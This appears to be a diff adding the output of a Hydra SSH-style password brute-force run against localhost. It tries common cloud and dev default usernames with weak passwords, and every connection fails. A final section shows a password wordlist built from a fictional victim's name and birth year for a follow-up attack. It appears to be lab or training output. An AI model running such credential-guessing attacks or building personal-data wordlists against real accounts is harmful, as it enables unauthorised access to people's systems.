+[ATTEMPT] target localhost - login "ansible" - pass "12345admin" - 207 of 288 [child 14] (0/33)
+[ERROR] Child with pid 11635 terminating, cannot connect
+[ATTEMPT] target localhost - login "ansible" - pass "superman" - 208 of 288 [child 15] (0/33)
+[ERROR] Child with pid 11640 terminating, cannot connect
+[ERROR] Child with pid 11641 terminating, cannot connect
+[ATTEMPT] target localhost - login "ansible" - pass "1q2w3e4r" - 209 of 288 [child 0] (0/33)
+[ATTEMPT] target localhost - login "ansible" - pass "qwerty123" - 210 of 288 [child 1] (0/33)
+[ERROR] Child with pid 11642 terminating, cannot connect
+[ERROR] Child with pid 11643 terminating, cannot connect
+[ATTEMPT] target localhost - login "ec2-user" - pass "123456" - 211 of 288 [child 2] (0/33)
+[ERROR] Child with pid 11644 terminating, cannot connect
+[ERROR] Child with pid 11645 terminating, cannot connect
+[ERROR] Child with pid 11646 terminating, cannot connect
+[ATTEMPT] target localhost - login "ec2-user" - pass "password" - 212 of 288 [child 3] (0/33)
+[ERROR] Child with pid 11648 terminating, cannot connect
+[ERROR] Child with pid 11649 terminating, cannot connect
+[ERROR] Child with pid 11650 terminating, cannot connect
+[ERROR] Child with pid 11651 terminating, cannot connect
+[ATTEMPT] target localhost - login "ec2-user" - pass "qwerty" - 213 of 288 [child 4] (0/33)
+[ATTEMPT] target localhost - login "ec2-user" - pass "admin" - 214 of 288 [child 5] (0/33)
+[ATTEMPT] target localhost - login "ec2-user" - pass "12345678" - 215 of 288 [child 6] (0/33)
+[ERROR] Child with pid 11652 terminating, cannot connect
+[ATTEMPT] target localhost - login "ec2-user" - pass "111111" - 216 of 288 [child 7] (0/33)
+[ATTEMPT] target localhost - login "ec2-user" - pass "iloveyou" - 217 of 288 [child 8] (0/33)
+[ATTEMPT] target localhost - login "ec2-user" - pass "monkey" - 218 of 288 [child 9] (0/33)
+[ATTEMPT] target localhost - login "ec2-user" - pass "dragon" - 219 of 288 [child 10] (0/33)
+[ATTEMPT] target localhost - login "ec2-user" - pass "letmein" - 220 of 288 [child 11] (0/33)
+[ERROR] Child with pid 11654 terminating, cannot connect
+[ERROR] Child with pid 11655 terminating, cannot connect
+[ATTEMPT] target localhost - login "ec2-user" - pass "football" - 221 of 288 [child 12] (0/33)
+[ATTEMPT] target localhost - login "ec2-user" - pass "12345admin" - 222 of 288 [child 13] (0/33)
+[ERROR] Child with pid 11658 terminating, cannot connect
+[ATTEMPT] target localhost - login "ec2-user" - pass "superman" - 223 of 288 [child 14] (0/33)
+[ERROR] Child with pid 11667 terminating, cannot connect
+[ATTEMPT] target localhost - login "ec2-user" - pass "1q2w3e4r" - 224 of 288 [child 15] (0/33)
+[ERROR] Child with pid 11671 terminating, cannot connect
+[ERROR] Child with pid 11672 terminating, cannot connect
+[ATTEMPT] target localhost - login "ec2-user" - pass "qwerty123" - 225 of 288 [child 0] (0/33)
+[ATTEMPT] target localhost - login "vagrant" - pass "123456" - 226 of 288 [child 1] (0/33)
+[ERROR] Child with pid 11673 terminating, cannot connect
+[ERROR] Child with pid 11674 terminating, cannot connect
+[ATTEMPT] target localhost - login "vagrant" - pass "password" - 227 of 288 [child 2] (0/33)
+[ATTEMPT] target localhost - login "vagrant" - pass "qwerty" - 228 of 288 [child 3] (0/33)
+[ERROR] Child with pid 11676 terminating, cannot connect
+[ERROR] Child with pid 11677 terminating, cannot connect
+[ERROR] Child with pid 11678 terminating, cannot connect
+[ATTEMPT] target localhost - login "vagrant" - pass "admin" - 229 of 288 [child 4] (0/33)
+[ERROR] Child with pid 11679 terminating, cannot connect
+[ERROR] Child with pid 11680 terminating, cannot connect
+[ATTEMPT] target localhost - login "vagrant" - pass "12345678" - 230 of 288 [child 5] (0/33)
+[ERROR] Child with pid 11681 terminating, cannot connect
+[ERROR] Child with pid 11682 terminating, cannot connect
+[ATTEMPT] target localhost - login "vagrant" - pass "111111" - 231 of 288 [child 6] (0/33)
+[ERROR] Child with pid 11683 terminating, cannot connect
+[ATTEMPT] target localhost - login "vagrant" - pass "iloveyou" - 232 of 288 [child 7] (0/33)
+[ATTEMPT] target localhost - login "vagrant" - pass "monkey" - 233 of 288 [child 8] (0/33)
+[ATTEMPT] target localhost - login "vagrant" - pass "dragon" - 234 of 288 [child 9] (0/33)
+[ATTEMPT] target localhost - login "vagrant" - pass "letmein" - 235 of 288 [child 10] (0/33)
+[ATTEMPT] target localhost - login "vagrant" - pass "football" - 236 of 288 [child 11] (0/33)
+[ERROR] Child with pid 11685 terminating, cannot connect
+[ERROR] Child with pid 11686 terminating, cannot connect
+[ATTEMPT] target localhost - login "vagrant" - pass "12345admin" - 237 of 288 [child 12] (0/33)
+[ATTEMPT] target localhost - login "vagrant" - pass "superman" - 238 of 288 [child 13] (0/33)
+[ERROR] Child with pid 11690 terminating, cannot connect
+[ATTEMPT] target localhost - login "vagrant" - pass "1q2w3e4r" - 239 of 288 [child 14] (0/33)
+[ERROR] Child with pid 11695 terminating, cannot connect
+[ATTEMPT] target localhost - login "vagrant" - pass "qwerty123" - 240 of 288 [child 15] (0/33)
+[ERROR] Child with pid 11698 terminating, cannot connect
+[ERROR] Child with pid 11699 terminating, cannot connect
+[ATTEMPT] target localhost - login "azureuser" - pass "123456" - 241 of 288 [child 0] (0/33)
+[ATTEMPT] target localhost - login "azureuser" - pass "password" - 242 of 288 [child 1] (0/33)
+[ERROR] Child with pid 11701 terminating, cannot connect
+[ERROR] Child with pid 11702 terminating, cannot connect
+[ATTEMPT] target localhost - login "azureuser" - pass "qwerty" - 243 of 288 [child 2] (0/33)
+[ATTEMPT] target localhost - login "azureuser" - pass "admin" - 244 of 288 [child 3] (0/33)
+[ERROR] Child with pid 11703 terminating, cannot connect
+[ERROR] Child with pid 11704 terminating, cannot connect
+[ERROR] Child with pid 11705 terminating, cannot connect
+[ATTEMPT] target localhost - login "azureuser" - pass "12345678" - 245 of 288 [child 4] (0/33)
+[ERROR] Child with pid 11706 terminating, cannot connect
+[ERROR] Child with pid 11707 terminating, cannot connect
+[ERROR] Child with pid 11708 terminating, cannot connect
+[ATTEMPT] target localhost - login "azureuser" - pass "111111" - 246 of 288 [child 5] (0/33)
+[ERROR] Child with pid 11709 terminating, cannot connect
+[ERROR] Child with pid 11710 terminating, cannot connect
+[ATTEMPT] target localhost - login "azureuser" - pass "iloveyou" - 247 of 288 [child 6] (0/33)
+[ATTEMPT] target localhost - login "azureuser" - pass "monkey" - 248 of 288 [child 7] (0/33)
+[ATTEMPT] target localhost - login "azureuser" - pass "dragon" - 249 of 288 [child 8] (0/33)
+[ATTEMPT] target localhost - login "azureuser" - pass "letmein" - 250 of 288 [child 9] (0/33)
+[ATTEMPT] target localhost - login "azureuser" - pass "football" - 251 of 288 [child 10] (0/33)
+[ATTEMPT] target localhost - login "azureuser" - pass "12345admin" - 252 of 288 [child 11] (0/33)
+[ERROR] Child with pid 11712 terminating, cannot connect
+[ERROR] Child with pid 11713 terminating, cannot connect
+[ATTEMPT] target localhost - login "azureuser" - pass "superman" - 253 of 288 [child 12] (0/33)
+[ATTEMPT] target localhost - login "azureuser" - pass "1q2w3e4r" - 254 of 288 [child 13] (0/33)
+[ERROR] Child with pid 11718 terminating, cannot connect
+[ATTEMPT] target localhost - login "azureuser" - pass "qwerty123" - 255 of 288 [child 14] (0/33)
+[ERROR] Child with pid 11724 terminating, cannot connect
+[REDO-ATTEMPT] target localhost - login "root" - pass "123456" - 256 of 288 [child 15] (1/33)
+[ERROR] Child with pid 11726 terminating, cannot connect
+[ERROR] Child with pid 11727 terminating, cannot connect
+[REDO-ATTEMPT] target localhost - login "root" - pass "password" - 257 of 288 [child 0] (2/33)
+[REDO-ATTEMPT] target localhost - login "root" - pass "qwerty" - 258 of 288 [child 1] (3/33)
+[ERROR] Child with pid 11728 terminating, cannot connect
+[ERROR] Child with pid 11729 terminating, cannot connect
+[REDO-ATTEMPT] target localhost - login "root" - pass "admin" - 259 of 288 [child 2] (4/33)
+[REDO-ATTEMPT] target localhost - login "root" - pass "12345678" - 260 of 288 [child 3] (5/33)
+[ERROR] Child with pid 11731 terminating, cannot connect
+[ERROR] Child with pid 11732 terminating, cannot connect
+[REDO-ATTEMPT] target localhost - login "root" - pass "111111" - 261 of 288 [child 4] (6/33)
+[ERROR] Child with pid 11733 terminating, cannot connect
+[ERROR] Child with pid 11734 terminating, cannot connect
+[REDO-ATTEMPT] target localhost - login "root" - pass "iloveyou" - 262 of 288 [child 5] (7/33)
+[ERROR] Child with pid 11735 terminating, cannot connect
+[ERROR] Child with pid 11736 terminating, cannot connect
+[ERROR] Child with pid 11737 terminating, cannot connect
+[REDO-ATTEMPT] target localhost - login "root" - pass "monkey" - 263 of 288 [child 6] (8/33)
+[REDO-ATTEMPT] target localhost - login "root" - pass "dragon" - 264 of 288 [child 7] (9/33)
+[ERROR] Child with pid 11738 terminating, cannot connect
+[REDO-ATTEMPT] target localhost - login "root" - pass "letmein" - 265 of 288 [child 8] (10/33)
+[REDO-ATTEMPT] target localhost - login "root" - pass "football" - 266 of 288 [child 9] (11/33)
+[REDO-ATTEMPT] target localhost - login "root" - pass "12345admin" - 267 of 288 [child 10] (12/33)
+[REDO-ATTEMPT] target localhost - login "root" - pass "superman" - 268 of 288 [child 11] (13/33)
+[ERROR] Child with pid 11740 terminating, cannot connect
+[ERROR] Child with pid 11741 terminating, cannot connect
+[REDO-ATTEMPT] target localhost - login "root" - pass "1q2w3e4r" - 269 of 288 [child 12] (14/33)
+[REDO-ATTEMPT] target localhost - login "root" - pass "qwerty123" - 270 of 288 [child 13] (15/33)
+[ERROR] Child with pid 11746 terminating, cannot connect
+[REDO-ATTEMPT] target localhost - login "admin" - pass "123456" - 271 of 288 [child 14] (16/33)
+[ERROR] Child with pid 11752 terminating, cannot connect
+[ERROR] Child with pid 11754 terminating, cannot connect
+[ERROR] Child with pid 11755 terminating, cannot connect
+[REDO-ATTEMPT] target localhost - login "admin" - pass "password" - 272 of 288 [child 15] (17/33)
+[REDO-ATTEMPT] target localhost - login "admin" - pass "qwerty" - 273 of 288 [child 0] (18/33)
+[REDO-ATTEMPT] target localhost - login "admin" - pass "admin" - 274 of 288 [child 1] (19/33)
+[ERROR] Child with pid 11756 terminating, cannot connect
+[ERROR] Child with pid 11757 terminating, cannot connect
+[REDO-ATTEMPT] target localhost - login "admin" - pass "12345678" - 275 of 288 [child 2] (20/33)
+[REDO-ATTEMPT] target localhost - login "admin" - pass "111111" - 276 of 288 [child 3] (21/33)
+[ERROR] Child with pid 11759 terminating, cannot connect
+[ERROR] Child with pid 11760 terminating, cannot connect
+[REDO-ATTEMPT] target localhost - login "admin" - pass "iloveyou" - 277 of 288 [child 4] (22/33)
+[ERROR] Child with pid 11761 terminating, cannot connect
+[REDO-ATTEMPT] target localhost - login "admin" - pass "monkey" - 278 of 288 [child 5] (23/33)
+[ERROR] Child with pid 11762 terminating, cannot connect
+[ERROR] Child with pid 11763 terminating, cannot connect
+[REDO-ATTEMPT] target localhost - login "admin" - pass "dragon" - 279 of 288 [child 6] (24/33)
+[ERROR] Child with pid 11764 terminating, cannot connect
+[REDO-ATTEMPT] target localhost - login "admin" - pass "letmein" - 280 of 288 [child 7] (25/33)
+[ERROR] Child with pid 11765 terminating, cannot connect
+[ERROR] Child with pid 11766 terminating, cannot connect
+[REDO-ATTEMPT] target localhost - login "admin" - pass "football" - 281 of 288 [child 8] (26/33)
+[REDO-ATTEMPT] target localhost - login "admin" - pass "12345admin" - 282 of 288 [child 9] (27/33)
+[REDO-ATTEMPT] target localhost - login "admin" - pass "superman" - 283 of 288 [child 10] (28/33)
+[REDO-ATTEMPT] target localhost - login "admin" - pass "1q2w3e4r" - 284 of 288 [child 11] (29/33)
+[ERROR] Child with pid 11767 terminating, cannot connect
+[ERROR] Child with pid 11768 terminating, cannot connect
+[REDO-ATTEMPT] target localhost - login "admin" - pass "qwerty123" - 285 of 288 [child 12] (30/33)
+[REDO-ATTEMPT] target localhost - login "test" - pass "123456" - 286 of 288 [child 13] (31/33)
+[ERROR] Child with pid 11775 terminating, cannot connect
+[REDO-ATTEMPT] target localhost - login "test" - pass "password" - 287 of 288 [child 14] (32/33)
+[ERROR] Child with pid 11780 terminating, cannot connect
+[ERROR] Child with pid 11781 terminating, cannot connect
+[ERROR] Child with pid 11782 terminating, cannot connect
+[REDO-ATTEMPT] target localhost - login "test" - pass "qwerty" - 288 of 288 [child 15] (33/33)
+[ERROR] Child with pid 11783 terminating, cannot connect
+[ERROR] Child with pid 11784 terminating, cannot connect
+[ERROR] Child with pid 11786 terminating, cannot connect
+[ERROR] Child with pid 11787 terminating, cannot connect
+[ERROR] Child with pid 11788 terminating, cannot connect
+[ERROR] Child with pid 11789 terminating, cannot connect
+[ERROR] Child with pid 11790 terminating, cannot connect
+[ERROR] Child with pid 11791 terminating, cannot connect
+[ERROR] Child with pid 11792 terminating, cannot connect
+[ERROR] Child with pid 11793 terminating, cannot connect
+[ERROR] Child with pid 11795 terminating, cannot connect
+[ERROR] Child with pid 11796 terminating, cannot connect
+[ERROR] Child with pid 11803 terminating, cannot connect
+[ERROR] Child with pid 11808 terminating, cannot connect
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-01 19:02:20
+
+===== Task: hybrid attack - wordlist built from victim's personal data =====
+Generated 74 candidates from fictional 'John Doe, 1990'. Sample:
+1990
+1990!
+19901
+1990123
+19901990
+199090
+1990@
+1990Doe
+1990John
+90
+90!
+901
+90123
+901990
+9090
+90@
+DOE
+DOE!
+DOE1
+DOE123
+
+This custom_wordlist.txt would be fed to hydra with -P instead of passwords.txt.
